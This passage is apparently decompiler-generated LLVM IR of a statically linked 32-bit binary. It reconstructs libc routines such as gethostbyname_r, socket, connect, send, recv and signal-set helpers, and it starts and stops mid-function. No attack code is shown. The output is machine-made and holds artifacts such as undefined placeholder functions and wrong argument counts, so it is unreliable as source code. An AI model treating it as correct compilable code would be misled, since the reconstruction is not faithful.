  %v9_8049ec3 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80524ec.31, i32 ptrtoint (i32* @global_var_8052320.30 to i32), i32 460, i32 %v2_8049eab, i32 %v0_8049ea3, i32 %v0_8049ea8, i32 %v0_8049ea8)
  %v3_8049ec8 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8049ec8
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8049ed0 = load i32, i32* @ebp, align 4
  %v0_8049ed1 = load i32, i32* @edi, align 4
  %v0_8049ed2 = load i32, i32* @esi, align 4
  %v0_8049ed3 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8049ee3 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8049ee3, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8049eee = icmp eq i32 %arg1, 0
  br i1 %v4_8049eee, label %dec_label_pc_804a1fa, label %dec_label_pc_8049ef9

dec_label_pc_8049ef9:                             ; preds = %entry
  %v1_8049ef9 = call i32 @__errno_location(i32 %v0_8049ed3)
  store i32 %v1_8049ef9, i32* %eax.global-to-local, align 4
  %v1_8049efe = inttoptr i32 %v1_8049ef9 to i32*
  %v2_8049efe = load i32, i32* %v1_8049efe, align 4
  store i32 %v2_8049efe, i32* @edi, align 4
  store i32 %v1_8049ef9, i32* @esi, align 4
  store i32 0, i32* %v1_8049efe, align 4
  %v0_8049f11 = load i32, i32* @ebx, align 4
  store i32 %v0_8049f11, i32* %stack_var_-108, align 4
  %v7_8049f1d = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8049f11, i32 %arg5, i32 %arg6, i32 %v1_8049ef9)
  store i32 %v7_8049f1d, i32* %eax.global-to-local, align 4
  %v1_8049f25 = icmp eq i32 %v7_8049f1d, 0
  br i1 %v1_8049f25, label %dec_label_pc_804a1fa, label %dec_label_pc_8049f2d

dec_label_pc_8049f2d:                             ; preds = %dec_label_pc_8049ef9
  %v1_8049f31 = inttoptr i32 %arg6 to i32*
  %v2_8049f31 = load i32, i32* %v1_8049f31, align 4
  store i32 %v2_8049f31, i32* %edx.global-to-local, align 4
  %v9_8049f33 = icmp eq i32 %v2_8049f31, 1
  br i1 %v9_8049f33, label %dec_label_pc_8049f4d, label %dec_label_pc_8049f38

dec_label_pc_8049f38:                             ; preds = %dec_label_pc_8049f2d
  %v9_8049f38 = icmp eq i32 %v2_8049f31, 4
  br i1 %v9_8049f38, label %dec_label_pc_8049f4d, label %dec_label_pc_8049f3d

dec_label_pc_8049f3d:                             ; preds = %dec_label_pc_8049f38
  %v1_8049f3d = add i32 %v2_8049f31, 1
  %v8_8049f3d = icmp eq i32 %v1_8049f3d, 0
  store i32 %v1_8049f3d, i32* %edx.global-to-local, align 4
  %v1_8049f3e = icmp eq i1 %v8_8049f3d, false
  br i1 %v1_8049f3e, label %dec_label_pc_804a1fa, label %dec_label_pc_8049f44

dec_label_pc_8049f44:                             ; preds = %dec_label_pc_8049f3d
  %v0_8049f44 = load i32, i32* @esi, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  %v11_8049f44 = icmp eq i32 %v2_8049f44, 2
  %v1_8049f47 = icmp eq i1 %v11_8049f44, false
  br i1 %v1_8049f47, label %dec_label_pc_804a1fa, label %dec_label_pc_8049f4d

dec_label_pc_8049f4d:                             ; preds = %dec_label_pc_8049f44, %dec_label_pc_8049f38, %dec_label_pc_8049f2d
  %v0_8049f4d = load i32, i32* @ebp, align 4
  %v1_8049f4f = sub i32 0, %v0_8049f4d
  %v1_8049f51 = urem i32 %v1_8049f4f, 4
  %v2_8049f51 = icmp eq i32 %v1_8049f51, 0
  store i32 %v1_8049f51, i32* %eax.global-to-local, align 4
  %v0_8049f54 = load i32, i32* @edi, align 4
  %v1_8049f54 = load i32, i32* @esi, align 4
  %v2_8049f54 = inttoptr i32 %v1_8049f54 to i32*
  store i32 %v0_8049f54, i32* %v2_8049f54, align 4
  %v0_8049f68.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8049f51, label %dec_label_pc_8049f64, label %dec_label_pc_8049f58

dec_label_pc_8049f58:                             ; preds = %dec_label_pc_8049f4d
  %v1_8049f58 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f58 = sub i32 %v0_8049f68.pre, %v1_8049f58
  %v7_8049f58 = icmp ult i32 %v0_8049f68.pre, %v1_8049f58
  br i1 %v7_8049f58, label %dec_label_pc_804a1f5, label %dec_label_pc_8049f60

dec_label_pc_8049f60:                             ; preds = %dec_label_pc_8049f58
  %v0_8049f60 = load i32, i32* @ebp, align 4
  %v2_8049f60 = add i32 %v0_8049f60, %v1_8049f58
  store i32 %v2_8049f60, i32* @ebp, align 4
  store i32 %v2_8049f58, i32* @ebx, align 4
  br label %dec_label_pc_8049f64

dec_label_pc_8049f64:                             ; preds = %dec_label_pc_8049f4d, %dec_label_pc_8049f60
  %v0_8049f68 = phi i32 [ %v2_8049f58, %dec_label_pc_8049f60 ], [ %v0_8049f68.pre, %dec_label_pc_8049f4d ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8049f31, align 4
  %tmp41 = icmp ult i32 %v0_8049f68, 4
  br i1 %tmp41, label %dec_label_pc_804a1f5, label %dec_label_pc_8049f77

dec_label_pc_8049f77:                             ; preds = %dec_label_pc_8049f64
  %v0_8049f77 = load i32, i32* @ebx, align 4
  %v1_8049f77 = add i32 %v0_8049f77, -4
  store i32 %v1_8049f77, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_8049f77, 8
  br i1 %tmp42, label %dec_label_pc_804a1f5, label %dec_label_pc_8049f83

dec_label_pc_8049f83:                             ; preds = %dec_label_pc_8049f77
  %v1_8049f83 = add i32 %v0_8049f77, -12
  store i32 %v1_8049f83, i32* %eax.global-to-local, align 4
  %v0_8049f86 = load i32, i32* @ebp, align 4
  %v1_8049f86 = add i32 %v0_8049f86, 4
  store i32 %v1_8049f86, i32* %edx.global-to-local, align 4
  store i32 %v1_8049f86, i32* %stack_var_-92, align 4
  %v3_8049f8f = inttoptr i32 %v1_8049f86 to i32*
  store i32 %v0_8049f86, i32* %v3_8049f8f, align 4
  %v0_8049f92 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049f92 = add i32 %v0_8049f92, 4
  %v2_8049f92 = inttoptr i32 %v1_8049f92 to i32*
  store i32 0, i32* %v2_8049f92, align 4
  %tmp43 = icmp ult i32 %v1_8049f83, 32
  br i1 %tmp43, label %dec_label_pc_804a1f5, label %dec_label_pc_8049f9f

dec_label_pc_8049f9f:                             ; preds = %dec_label_pc_8049f83
  %v0_8049f9f = load i32, i32* @ebx, align 4
  %v1_8049f9f = add i32 %v0_8049f9f, -44
  store i32 %v1_8049f9f, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8049f9f, 256
  br i1 %tmp44, label %dec_label_pc_804a1f5, label %dec_label_pc_8049fb2

dec_label_pc_8049fb2:                             ; preds = %dec_label_pc_8049f9f
  %v0_8049fb2 = load i32, i32* @ebp, align 4
  %v1_8049fb2 = add i32 %v0_8049fb2, 12
  %v1_8049fb9 = add i32 %v0_8049fb2, 44
  store i32 %v1_8049fb9, i32* @edi, align 4
  store i32 %v1_8049fb9, i32* %stack_var_-108, align 4
  %v4_8049fc6 = inttoptr i32 %v1_8049fb9 to i8*
  %v5_8049fc6 = call i32 @strncpy(i8* %v4_8049fc6, i32 %arg1, i32 %v1_8049f9f, i32 %v1_8049fb2)
  %v0_8049fcb = load i32, i32* @edi, align 4
  %v1_8049fcb = load i32, i32* @ebp, align 4
  %v2_8049fcb = add i32 %v1_8049fcb, 12
  %v3_8049fcb = inttoptr i32 %v2_8049fcb to i32*
  store i32 %v0_8049fcb, i32* %v3_8049fcb, align 4
  %v1_8049fd2 = add i32 %v0_8049fb2, 16
  %v2_8049fd2 = inttoptr i32 %v1_8049fd2 to i32*
  store i32 0, i32* %v2_8049fd2, align 4
  %v2_8049fd9 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8049fd9, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8049fdb = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8049fe0 = inttoptr i32 %arg1 to i8*
  %v3_8049fe0 = call i32 @inet_aton(i8* %v2_8049fe0, i32 %v0_8049fdb)
  store i32 %v3_8049fe0, i32* %eax.global-to-local, align 4
  %v1_8049fe8 = icmp eq i32 %v3_8049fe0, 0
  br i1 %v1_8049fe8, label %dec_label_pc_804a024, label %dec_label_pc_8049fec

dec_label_pc_8049fec:                             ; preds = %dec_label_pc_8049fb2
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8049ff0 = load i32, i32* @edi, align 4
  store i32 %v0_8049ff0, i32* %arg2, align 4
  %v1_8049ff2 = add i32 %tmp18, 8
  %v2_8049ff2 = inttoptr i32 %v1_8049ff2 to i32*
  store i32 2, i32* %v2_8049ff2, align 4
  %v0_8049ff9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ff9 = add i32 %v0_8049ff9, 12
  %v2_8049ff9 = inttoptr i32 %v1_8049ff9 to i32*
  store i32 4, i32* %v2_8049ff9, align 4
  %v2_804a000 = load i32, i32* %stack_var_-92, align 4
  %v1_804a003 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a003 = add i32 %v1_804a003, 16
  %v3_804a003 = inttoptr i32 %v2_804a003 to i32*
  store i32 %v2_804a000, i32* %v3_804a003, align 4
  %v1_804a00a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a00a = add i32 %v1_804a00a, 4
  %v3_804a00a = inttoptr i32 %v2_804a00a to i32*
  store i32 %v1_8049fb2, i32* %v3_804a00a, align 4
  %v0_804a011 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804a011, i32* %v1_8049ee3, align 4
  store i32 0, i32* %v1_8049f31, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1fa

dec_label_pc_804a024:                             ; preds = %dec_label_pc_8049fb2
  %v0_804a024 = call i32 @__open_nameservers()
  store i32 %v0_804a024, i32* @eax, align 4
  %v2_804a034 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804a034, i32* @ebx, align 4
  store i32 %v2_804a034, i32* %stack_var_-108, align 4
  %v2_804a039 = call i32 @__pthread_return_void(i32 %v2_804a034, i32 134526883)
  store i32 %v2_804a039, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %stack_var_-108, align 4
  %v1_804a045 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  %v0_804a04a = load i32, i32* @global_var_8054994.33, align 4
  store i32 %v0_804a04a, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* @ecx, align 4
  store i32 134526883, i32* @eax, align 4
  store i32 %v2_804a034, i32* %stack_var_-108, align 4
  %v2_804a055 = call i32 @__pthread_return_void(i32 %v2_804a034, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804a070 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804a075 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804a075, i32* %eax.global-to-local, align 4
  store i32 %v2_804a075, i32* %stack_var_-108, align 4
  %v0_804a07f = load i32, i32* @esi, align 4
  %v7_804a086 = call i32 @__dns_lookup(i8* %v2_8049fe0, i32 1, i32 %v0_804a07f, i32 ptrtoint (i32* @global_var_8054988.34 to i32), i32 %v2_804a075, i32 %v2_804a070)
  store i32 %v7_804a086, i32* %eax.global-to-local, align 4
  %v2_804a08e = icmp slt i32 %v7_804a086, 0
  %v1_804a090 = icmp eq i1 %v2_804a08e, false
  br i1 %v1_804a090, label %dec_label_pc_804a0a6, label %dec_label_pc_804a092

dec_label_pc_804a092:                             ; preds = %dec_label_pc_804a024
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8049f31, align 4
  br label %dec_label_pc_804a1fa

dec_label_pc_804a0a6:                             ; preds = %dec_label_pc_804a024
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804a0b9 = icmp ugt i32 %v1_8049f9f, 256
  %v15_804a0b9 = icmp eq i32 %v0_8049f9f, 300
  %v2_804a0bd = or i1 %v10_804a0b9, %v15_804a0b9
  br i1 %v2_804a0bd, label %dec_label_pc_804a158, label %dec_label_pc_804a0bf

dec_label_pc_804a0bf:                             ; preds = %dec_label_pc_804a0a6
  %v3_804a0c2 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804a0c2, i32* %stack_var_-108, align 4
  %v1_804a0c6 = call i32 @free(i32 %v3_804a0c2)
  store i32 %v1_804a0c6, i32* %eax.global-to-local, align 4
  store i32 %v3_804a0c2, i32* @edi, align 4
  %v3_804a0cc = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a0cc, i32* %stack_var_-108, align 4
  %v1_804a0d0 = call i32 @free(i32 %v3_804a0cc)
  store i32 -1, i32* %v1_8049f31, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1d0

dec_label_pc_804a158:                             ; preds = %dec_label_pc_804a0a6
  %v3_804a15d.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804a161.pre = load i32, i32* @edi, align 4
  store i32 %v0_804a161.pre, i32* %stack_var_-108, align 4
  %v4_804a162 = inttoptr i32 %v0_804a161.pre to i8*
  %v5_804a162 = call i32 @strncpy(i8* %v4_804a162, i32 %v3_804a15d.pre, i32 %v1_8049f9f, i32 %v2_804a034)
  store i32 %v5_804a162, i32* %eax.global-to-local, align 4
  %v3_804a168 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804a168, i32* %stack_var_-108, align 4
  %v1_804a16c = call i32 @free(i32 %v3_804a168)
  store i32 %v1_804a16c, i32* %eax.global-to-local, align 4
  %v12_804a174 = icmp eq i32 %tmp10, 1
  %v1_804a179 = icmp eq i1 %v12_804a174, false
  br i1 %v1_804a179, label %dec_label_pc_804a1d5, label %dec_label_pc_804a17b

dec_label_pc_804a17b:                             ; preds = %dec_label_pc_804a158
  %v0_804a17b = load i32, i32* @edx, align 4
  %v0_804a182 = load i32, i32* @ebp, align 4
  store i32 %v0_804a182, i32* %stack_var_-108, align 4
  %v3_804a183 = inttoptr i32 %tmp to i16*
  %v4_804a183 = call i32 @memcpy(i16* %v3_804a183, i32 4, i32 %v0_804a17b)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804a18c = load i32, i32* @edi, align 4
  store i32 %v0_804a18c, i32* %arg2, align 4
  %v1_804a18e = add i32 %tmp18, 8
  %v2_804a18e = inttoptr i32 %v1_804a18e to i32*
  store i32 2, i32* %v2_804a18e, align 4
  %v0_804a195 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a195 = add i32 %v0_804a195, 12
  %v2_804a195 = inttoptr i32 %v1_804a195 to i32*
  store i32 4, i32* %v2_804a195, align 4
  %v3_804a19c = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804a19c, i32* %edx.global-to-local, align 4
  %v1_804a1a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a1a0 = add i32 %v1_804a1a0, 16
  %v3_804a1a0 = inttoptr i32 %v2_804a1a0 to i32*
  store i32 %v3_804a19c, i32* %v3_804a1a0, align 4
  %v1_804a1a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a1a7 = add i32 %v1_804a1a7, 4
  %v3_804a1a7 = inttoptr i32 %v2_804a1a7 to i32*
  store i32 %v1_8049fb2, i32* %v3_804a1a7, align 4
  %v2_804a1aa = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804a1aa, i32* %eax.global-to-local, align 4
  %v3_804a1ab = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a1ab, i32* %stack_var_-108, align 4
  %v1_804a1af = call i32 @free(i32 %v3_804a1ab)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8049ee3, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8049f31, align 4
  br label %dec_label_pc_804a1d0

dec_label_pc_804a1d0:                             ; preds = %dec_label_pc_804a1d5, %dec_label_pc_804a0bf, %dec_label_pc_804a17b
  br label %dec_label_pc_804a1fa

dec_label_pc_804a1d5:                             ; preds = %dec_label_pc_804a158
  %v3_804a1d8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a1d8, i32* %stack_var_-108, align 4
  %v1_804a1dc = call i32 @free(i32 %v3_804a1d8)
  store i32 1, i32* %v1_8049f31, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1d0

dec_label_pc_804a1f5:                             ; preds = %dec_label_pc_8049f9f, %dec_label_pc_8049f83, %dec_label_pc_8049f77, %dec_label_pc_8049f64, %dec_label_pc_8049f58
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1fa

dec_label_pc_804a1fa:                             ; preds = %dec_label_pc_8049f44, %dec_label_pc_8049f3d, %dec_label_pc_8049ef9, %entry, %dec_label_pc_804a1d0, %dec_label_pc_804a092, %dec_label_pc_8049fec, %dec_label_pc_804a1f5
  store i32 %v0_8049ed3, i32* @ebx, align 4
  store i32 %v0_8049ed2, i32* @esi, align 4
  store i32 %v0_8049ed1, i32* @edi, align 4
  store i32 %v0_8049ed0, i32* @ebp, align 4
  %v0_804a201 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804a201

; uselistorder directives
  uselistorder i32 %v2_804a034, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_8049fb9, { 1, 0, 2 }
  uselistorder i32 %v1_8049fb2, { 2, 1, 0 }
  uselistorder i32 %v1_8049f9f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8049f68.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8049f51, { 1, 0 }
  uselistorder i32 %v2_8049f31, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8049f31, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8049ee3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804a1fa, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a1d0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8049f64, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a21f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a226 = call i32 @__socketcall(i32 3, i32 %v2_804a21f)
  ret i32 %v2_804a226

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804a25b = ptrtoint i32* %stack_var_-20 to i32
  %v2_804a262 = call i32 @__socketcall(i32 15, i32 %v2_804a25b)
  ret i32 %v2_804a262

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a28f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a296 = call i32 @__socketcall(i32 10, i32 %v2_804a28f)
  ret i32 %v2_804a296

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a2c3 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a2ca = call i32 @__socketcall(i32 9, i32 %v2_804a2c3)
  ret i32 %v2_804a2ca

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a2ef = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a2f6 = call i32 @__socketcall(i32 1, i32 %v2_804a2ef)
  ret i32 %v2_804a2f6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 4, 3, 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804a300 = load i32, i32* @ebx, align 4
  %v15_804a301 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804a315 = icmp eq i32 %arg2, -1
  br i1 %v10_804a315, label %dec_label_pc_804a323, label %dec_label_pc_804a31a

dec_label_pc_804a31a:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804a323, label %dec_label_pc_804a31e

dec_label_pc_804a31e:                             ; preds = %dec_label_pc_804a31a
  %v7_804a321 = icmp sgt i32 %arg1, 64
  br i1 %v7_804a321, label %dec_label_pc_804a323, label %dec_label_pc_804a330

dec_label_pc_804a323:                             ; preds = %dec_label_pc_804a31e, %dec_label_pc_804a31a, %entry
  %v1_804a323 = call i32 @__errno_location(i32 %v0_804a300)
  store i32 %v1_804a323, i32* %eax.global-to-local, align 4
  %v1_804a328 = inttoptr i32 %v1_804a323 to i32*
  store i32 22, i32* %v1_804a328, align 4
  br label %dec_label_pc_804a3a4

dec_label_pc_804a330:                             ; preds = %dec_label_pc_804a31e
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a33e

dec_label_pc_804a33e:                             ; preds = %dec_label_pc_804a33e.dec_label_pc_804a33e_crit_edge, %dec_label_pc_804a330
  %v0_804a33e = phi i32 [ %v15_804a301, %dec_label_pc_804a330 ], [ %v0_804a33e.pre, %dec_label_pc_804a33e.dec_label_pc_804a33e_crit_edge ]
  %v1_804a34917 = phi i32 [ 31, %dec_label_pc_804a330 ], [ %v1_804a349, %dec_label_pc_804a33e.dec_label_pc_804a33e_crit_edge ]
  %v2_804a33e = mul i32 %v1_804a34917, 4
  %v3_804a33e = add i32 %v2_804a33e, 160
  %v4_804a33e = add i32 %v3_804a33e, %v0_804a33e
  %v5_804a33e = inttoptr i32 %v4_804a33e to i32*
  store i32 0, i32* %v5_804a33e, align 4
  %v0_804a349.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804a349 = add i32 %v0_804a349.pre, -1
  %v9_804a349 = icmp slt i32 %v1_804a349, 0
  store i32 %v1_804a349, i32* %eax.global-to-local, align 4
  %v1_804a34a = icmp eq i1 %v9_804a349, false
  br i1 %v1_804a34a, label %dec_label_pc_804a33e.dec_label_pc_804a33e_crit_edge, label %dec_label_pc_804a34c

dec_label_pc_804a33e.dec_label_pc_804a33e_crit_edge: ; preds = %dec_label_pc_804a33e
  %v0_804a33e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a33e

dec_label_pc_804a34c:                             ; preds = %dec_label_pc_804a33e
  %v0_804a34c = load i32, i32* @edx, align 4
  %v2_804a34f = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804a34f, i32* %eax.global-to-local, align 4
  %v4_804a357 = call i32 @__sigaddset(i32 %v2_804a34f, i32 %arg1, i32 %v0_804a34c, i32 %v0_804a34c)
  store i32 %v4_804a357, i32* %eax.global-to-local, align 4
  %v2_804a35f = icmp slt i32 %v4_804a357, 0
  br i1 %v2_804a35f, label %dec_label_pc_804a3a4, label %dec_label_pc_804a363

dec_label_pc_804a363:                             ; preds = %dec_label_pc_804a34c
  %v4_804a36b = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8054580.35 to i32), i32 %arg1, i32 %v4_804a357, i32 %v4_804a357)
  %v2_804a384 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804a389 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804a389, i32* %eax.global-to-local, align 4
  %v4_804a392 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804a384)
  store i32 %v4_804a392, i32* %eax.global-to-local, align 4
  %v2_804a39a = icmp slt i32 %v4_804a392, 0
  br i1 %v2_804a39a, label %dec_label_pc_804a3a4, label %dec_label_pc_804a39e

dec_label_pc_804a39e:                             ; preds = %dec_label_pc_804a363
  %v3_804a39e = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804a3a7

dec_label_pc_804a3a4:                             ; preds = %dec_label_pc_804a363, %dec_label_pc_804a34c, %dec_label_pc_804a323
  br label %dec_label_pc_804a3a7

dec_label_pc_804a3a7:                             ; preds = %dec_label_pc_804a39e, %dec_label_pc_804a3a4
  %storemerge = phi i32 [ -1, %dec_label_pc_804a3a4 ], [ %v3_804a39e, %dec_label_pc_804a39e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804a300, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804a349, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804a3a7, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804a3be = add i32 %arg2, -1
  %v1_804a3c1 = urem i32 %v1_804a3be, 32
  %v2_804a3c1 = icmp eq i32 %v1_804a3c1, 0
  %v2_804a3c4 = udiv i32 %v1_804a3be, 32
  br i1 %v2_804a3c1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804a3c7 = shl i32 1, %v1_804a3c1
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a3c9 = phi i32 [ 1, %entry ], [ %v5_804a3c7, %bb ]
  %v2_804a3c9 = mul nuw nsw i32 %v2_804a3c4, 4
  %v3_804a3c9 = add i32 %v2_804a3c9, %arg1
  %v4_804a3c9 = inttoptr i32 %v3_804a3c9 to i32*
  %v5_804a3c9 = load i32, i32* %v4_804a3c9, align 4
  %v7_804a3c9 = and i32 %v5_804a3c9, %v6_804a3c9
  %v8_804a3c9 = icmp eq i32 %v7_804a3c9, 0
  %v1_804a3cd = icmp eq i1 %v8_804a3c9, false
  %v2_804a3cd = zext i1 %v1_804a3cd to i32
  ret i32 %v2_804a3cd

; uselistorder directives
  uselistorder i32 %v1_804a3c1, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a3d4 = load i32, i32* @ebx, align 4
  store i32 %v0_804a3d4, i32* %stack_var_-4, align 4
  %v1_804a3e2 = add i32 %arg2, -1
  %v1_804a3e5 = urem i32 %v1_804a3e2, 32
  %v2_804a3e5 = icmp eq i32 %v1_804a3e5, 0
  store i32 %v1_804a3e5, i32* @ecx, align 4
  br i1 %v2_804a3e5, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_804a3e8 = shl i32 1, %v1_804a3e5
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804a3ed = phi i32 [ 1, %entry ], [ %v5_804a3e8, %bb ]
  %v2_804a3ea = udiv i32 %v1_804a3e2, 32
  store i32 %v2_804a3ea, i32* @edx, align 4
  %v2_804a3ed = mul nuw nsw i32 %v2_804a3ea, 4
  %v3_804a3ed = add i32 %v2_804a3ed, %arg1
